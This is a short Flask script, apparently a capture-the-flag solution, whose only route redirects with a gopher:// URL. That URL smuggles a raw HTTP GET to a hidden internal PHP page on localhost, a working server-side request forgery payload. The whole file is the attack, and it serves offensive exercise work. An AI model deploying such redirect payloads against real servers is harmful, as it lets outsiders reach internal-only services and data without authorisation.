from flask import Flask, redirect
import base64
 
app = Flask(__name__)    
 
@app.route('/chall_1')    
def chall_1():
    # challenge 1
    # request /internal_e0134cd5a917.php
    return redirect('gopher://localhost:80/_GET%20/internal_e0134cd5a917.php%20HTTP/1.0%0d%0a', code=301)
 
if __name__ == "__main__":    
    app.run(debug=True, host="0.0.0.0", port=8080)
